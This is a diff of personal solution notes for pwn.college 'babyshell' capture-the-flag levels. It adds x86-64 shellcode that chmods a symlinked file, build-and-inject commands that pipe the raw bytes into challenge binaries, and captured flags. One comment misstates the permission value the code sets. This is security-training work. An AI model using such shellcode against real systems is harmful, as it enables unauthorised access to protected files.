@@ -472,11 +472,29 @@ pwn.college{U9daynYJnepLdAJU-nWLYoGWVgR.QXyIjMscTOxUzW}
 
 # 7
 
-gcc -nostdlib -o solve.elf shell7_2.s
+.global _start
+.intel_syntax noprefix
+_start:
+
+    # load path Z to register  
+    xor rcx, rcx
+    mov cl, 0x5A       # symlink to Z cl -> rcx
+	push rcx            
+	push rsp            # RSP stack pointer
+	pop rdi
+
+   	mov sil, 0x7          # set perm to 4
+    mov al, 90          # chmod syscall
+	syscall
+
+gcc -nostdlib -o solve.elf shellchmod3.s
 ./solve.elf
 objdump -M intel -d solve.elf
 objcopy --dump-section .text=solve.bin solve.elf
-cat solve.bin | /challenge/babyshell_level7
+cat solve.bin | /challenge/babyshell_level*
+
+pwn.college{YvvQpWzaXS-2QeDcFbjRXlFSsuE.QXzIjMscTOxUzW}
+
 
 # 8 -> 10 ->11 solves
 # 8
@@ -504,12 +522,6 @@ cat solve.bin | /challenge/babyshell_level*
 run cat Z
 pwn.college{A_y2Yv8-W_AN4clyzzCpt_2Cv-S.QX0IjMscTOxUzW}
 
-
-gcc -nostdlib -o solve.elf schmod2.s
-./solve.elf
-objdump -M intel -d solve.elf
-objcopy --dump-section .text=solve.bin solve.elf
-cat solve.bin | /challenge/babyshell_level*
 
 # 9
 
@@ -539,7 +551,7 @@ _start:
     	mov al, 90         # chmod syscall
 	syscall
 
-gcc -nostdlib -o solve.elf shell12.s
+gcc -nostdlib -o solve.elf shell.s
 ./solve.elf
 objdump -M intel -d solve.elf
 objcopy --dump-section .text=solve.bin solve.elf
